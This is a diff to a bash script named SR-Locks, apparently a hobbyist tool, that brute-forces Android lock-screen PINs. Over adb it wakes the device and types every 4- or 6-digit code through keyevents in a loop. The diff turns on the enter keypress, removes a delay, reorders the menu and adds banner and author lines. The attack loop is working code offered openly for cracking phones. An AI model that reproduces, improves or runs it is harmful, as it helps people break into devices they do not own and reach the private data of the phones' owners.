@@ -69,10 +69,11 @@ function 6digit()
 adb shell input keyevent 26 # power
 adb shell input keyevent 82 # menu
 #adb shell input swipe 407 1211 378 85
-#adb shell input keyevent 66 # enter
-sleep 3
+adb shell input keyevent 66 # enter
+#sleep 3
 for i in {000000..999999}; do
-    echo "Try =>" $i
+
+    echo "$BLUE [+]$GREEN Sending $i"
 
     for (( j=0; j<${#i}; j++ )); do
         adb shell input keyevent $((`echo ${i:$j:1}`+7))
@@ -113,35 +114,43 @@ printf "$RED|=========================================|>\n$GREEN"
 figlet -tc SR-Locks -f slant
 printf '%s%*s%s' "$RED" $col "<|=========================================|"
 printf "$RED|=========================|>\n\n$NC"
-
+print_centered "-=[ INFORMATION ]=-"
 print_centered "-=[ Author: Arie-SR91 ]=-"
+print_centered "-=[ Version: 1.1.0-SR ]=-"
+print_centered "-=[ SOCIALMEDIA ]=-"
 print_centered "-=[ Github: https://github.com/ArieSR91 ]=-"
 print_centered "-=[ Tiktok: https://tiktok.com/@arie_sr91 ]=-"
 print_centered "-=[ Youtube: https://youtube.com/@arie_sr91 ]=-"
 
 function start_srlocks()
 {
-    echo -e "------------------------------$GREEN\n"
+    echo -e "\n------------------------------$GREEN\n"
     adb devices
     echo "$NC------------------------------"
-    echo -e "$YELLOW [1]$BLUE Android pin 4 digit\n$YELLOW [2]$BLUE Android pin 6 digit\n$YELLOW [3]$BLUE Connect adb\n$YELLOW [4]$BLUE Exit$NC"
-    echo -e "------------------------------\m"
-    read -p "Arie-SR91@srlocks:$PWD \$ " pilih;
-    if [ "$pilih" == "1" ] || [ "$pilih" == "" ]; then
+    echo -e "$YELLOW [1]$BLUE Connect to ADB\n$YELLOW [2]$BLUE Android pin 4 digit\n$YELLOW [3]$BLUE Android pin 6 digit\n$YELLOW [4]$BLUE Exit$NC"
+    echo -e "------------------------------"
+    if [ "$PWD" == "$HOME" ]; then
+        WD="~"
+    else
+        WD=$PWD
+    fi
+    read -p "Arie-SR91@srlocks:$WD\$ " pilih;
+    if [ "$pilih" == "1" ]; then
+        adb_connect
+        srlocks crack
+    fi
+    if [ "$pilih" == "2" ] || [ "$pilih" == "" ]; then
         echo -e "\n<---------------->"
         4digit
     fi
-    if [ "$pilih" == "2" ]; then
+    if [ "$pilih" == "3" ]; then
         echo -e "\n<---------------->"
         6digit
-    fi
-    if [ "$pilih" == "3" ]; then
-        adb_connect
-        srlocks crack
     fi
     if [ "$pilih" == "4" ]; then
         exit
     else
+        echo -e "Unknown command: $pilih\n"
         exit
     fi
 }
@@ -157,9 +166,6 @@ Options: crack    : brute force android pin
 case $1 in
     --help|-h|help)
         show_help
-        ;;
-    --version|-v)
-        echo "1.1.0-SR"
         ;;
     crack)
         start_srlocks
